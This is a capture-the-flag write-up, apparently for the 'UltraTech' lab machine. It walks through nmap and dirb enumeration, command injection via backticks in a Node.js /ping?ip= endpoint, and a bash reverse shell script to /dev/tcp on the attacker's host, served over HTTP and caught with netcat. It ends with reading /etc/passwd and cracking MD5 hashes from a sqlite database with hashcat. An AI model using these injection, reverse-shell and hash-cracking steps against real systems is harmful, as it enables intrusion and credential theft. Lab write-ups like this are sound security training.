## Scope
IP - 10.10.167.241

## Information Gathering


BASIC NMAP SCAN:

nmap -sV -p- 10.10.167.241 -T5 -v

```nmap
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
8081/tcp  open  http    Node.js Express framework
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
MAC Address: 02:CA:2C:71:12:59 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

VIEW WEB PAGES:

On port 8081 there's an API Endpoint.
![[Pasted image 20250702103431.png]]

On port 31331 we have a normal website running on apache 2.4.29
![[Pasted image 20250702103521.png]]

ROBOTS.TXT:
```robots.txt
Allow: *
User-Agent: *
Sitemap: /utech_sitemap.txt
```

/utech_sitemap.txt
```
/
/index.html
/what.html
/partners.html
```
## Enumeration

FURTHER NMAP ENUMERATION:

nmap -sV -sC -O -p21,22,8081,31331 10.10.167.241 -T5 -v

```nmap
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
8081/tcp  open  http    Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 15C1B7515662078EF4B5C724E2927A96
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
MAC Address: 02:CA:2C:71:12:59 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Linux 3.10 (92%), Linux 3.12 (92%), Linux 3.19 (92%), Linux 3.2 - 4.9 (92%)
```

Searching for Known Exploits for Technologies Enumerated:

lets try and find low hanging fruit with `searchsploit`:
ftp: vsftpd 3.0.3 - Remote Denial of Service
ssh: OpenSSH 2.3 < 7.7 - Username Enumeration | linux/remote/45233.py
apache/2.4.29: Exploits: No Results 
Node.js: Exploits: No Results

Allowed HTTP Methods:

Directory Enumeration:

dirb http://10.10.167.241:8081/ -w
```dirb
---- Scanning URL: http://10.10.167.241:8081/ ----
+ http://10.10.167.241:8081/auth (CODE:200|SIZE:39)                            
+ http://10.10.167.241:8081/ping (CODE:500|SIZE:1094)   
```


dirb http://10.10.167.241:31331/ -w
```dirb
---- Scanning URL: http://10.10.167.241:31331/ ----
==> DIRECTORY: http://10.10.167.241:31331/css/                                 
+ http://10.10.167.241:31331/favicon.ico (CODE:200|SIZE:15086)                 
==> DIRECTORY: http://10.10.167.241:31331/images/                              
+ http://10.10.167.241:31331/index.html (CODE:200|SIZE:6092)                   
==> DIRECTORY: http://10.10.167.241:31331/javascript/                          
==> DIRECTORY: http://10.10.167.241:31331/js/                                  
+ http://10.10.167.241:31331/robots.txt (CODE:200|SIZE:53)                     
+ http://10.10.167.241:31331/server-status (CODE:403|SIZE:304)                 
       
---- Entering directory: http://10.10.167.241:31331/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
     
---- Entering directory: http://10.10.167.241:31331/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
   
---- Entering directory: http://10.10.167.241:31331/javascript/ ----
==> DIRECTORY: http://10.10.167.241:31331/javascript/jquery/                   
   
---- Entering directory: http://10.10.167.241:31331/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
   
---- Entering directory: http://10.10.167.241:31331/javascript/jquery/ ----
+ http://10.10.167.241:31331/javascript/jquery/jquery (CODE:200|SIZE:268026)
```
 
Checking http://10.10.167.241:31331/js/ you'll find:
```
http://10.10.104.112:31331/js/api.js
http://10.10.104.112:31331/js/app.js
http://10.10.104.112:31331/js/app.min.js
```

API Enumeration:

Let's analyze the code at: http://10.10.104.112:31331/js/api.js

```JS
(function() {
    console.warn('Debugging ::');

    function getAPIURL() {
	return `${window.location.hostname}:8081`
    }
    
    function checkAPIStatus() {
	const req = new XMLHttpRequest();
	try {
	    const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
	    req.open('GET', url, true);
	    req.onload = function (e) {
		if (req.readyState === 4) {
		    if (req.status === 200) {
			console.log('The api seems to be running')
		    } else {
			console.error(req.statusText);
		    }
		}
	    };
	    req.onerror = function (e) {
		console.error(xhr.statusText);
	    };
	    req.send(null);
	}
	catch (e) {
	    console.error(e)
	    console.log('API Error');
	}
    }
    checkAPIStatus()
    const interval = setInterval(checkAPIStatus, 10000);
    const form = document.querySelector('form')
    form.action = `http://${getAPIURL()}/auth`;
    
})();
```

http://10.10.167.241:8081/ping
```
TypeError: Cannot read property 'replace' of undefined
    at app.get (/home/www/api/index.js:45:29)
    at Layer.handle [as handle_request] (/home/www/api/node_modules/express/lib/router/layer.js:95:5)
    at next (/home/www/api/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/home/www/api/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/home/www/api/node_modules/express/lib/router/layer.js:95:5)
    at /home/www/api/node_modules/express/lib/router/index.js:281:22
    at Function.process_params (/home/www/api/node_modules/express/lib/router/index.js:335:12)
    at next (/home/www/api/node_modules/express/lib/router/index.js:275:10)
    at cors (/home/www/api/node_modules/cors/lib/index.js:188:7)
    at /home/www/api/node_modules/cors/lib/index.js:224:17
```

ATTEMPTING COMMAND INJECTION
`/ping?ip=back_quote <malicious> back_quote`


http://10.10.167.241:8081/auth
```
You must specify a login and a password
```


## Exploitation

![[Pasted image 20250704162251.png]]
We have discovered a Command Injection on the `/ping?ip=` API endpoint by using the back-quote symbol. Now let's take advantage of this and get a reverse shell.

first let's write a payload and send over to the victim: 

let's make a bash file called shell.sh:
```bash
#!/bin/bash

bash -c 'exec bash -i &>/dev/tcp/10.6.46.187/8888 <&1'
```

we can then host it on a simple web server on our machine:

`python3 -m server.http 8080`

then we can send this to the victim via this request:
![[Pasted image 20250704164009.png]]
Yes! It transferred!
![[Pasted image 20250704164102.png]]

Finally we can create a listener on our machine using netcat
`nc -vlp 8888`

And run the script on the victim machine using:
![[Pasted image 20250704164502.png]]

Perfect! We gained a shell:
![[Pasted image 20250704165512.png]]
## Post Exploitation

### Local Enum:

#### **basic info:**
`/etc/hostname`
ultratech-prod

`whoami`
www

`/etc/passwd`
root:x:0:0:root:/root:/bin/bash
mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
ftp:x:112:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
r00t:x:1001:1001::/home/r00t:/bin/bash
www:x:1002:1002::/home/www:/bin/sh

#### **cron jobs:**

`crontab -l`

```sh
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
#
# m h  dom mon dow   command
* * * * * sh /home/www/api/start.sh
```

#### **files:**

found this interesting file
utech.db.sqlite

It has two user hashes 

r00t:f357a0c52799563c7c7b76c1e7543a32
admin:0d0ea5111e3c1def594c1684e3b9be84

let break them with hashcat

`hashcat -m 0 hashes.txt Wordlists/Passwords/rockyou.txt`

r00t:n100906
admin:mrsheafy